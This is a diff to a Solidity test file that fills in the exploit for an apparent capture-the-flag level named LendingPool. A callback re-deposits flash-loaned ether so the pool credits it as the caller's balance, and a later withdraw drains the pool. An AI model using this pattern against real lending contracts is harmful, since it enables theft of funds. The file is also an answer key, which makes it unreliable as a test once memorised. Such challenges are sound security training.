@@ -8,13 +8,20 @@ import "src/08_LendingPool/LendingPool.sol";
 contract LendingPoolTest is BaseTest {
     LendingPool instance;
 
+    function execute() external payable {
+        // Deposit to the contract, increasing recorded balance artificially
+        instance.deposit{value: msg.value}();
+    }
+
     function setUp() public override {
         super.setUp();
         instance = new LendingPool{value: 0.1 ether}();
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.flashLoan(0.1 ether);
+        // Withdraw the total balance, which has been increased in (flashloan) execute but not payed
+        instance.withdraw();
 
         checkSuccess();
     }
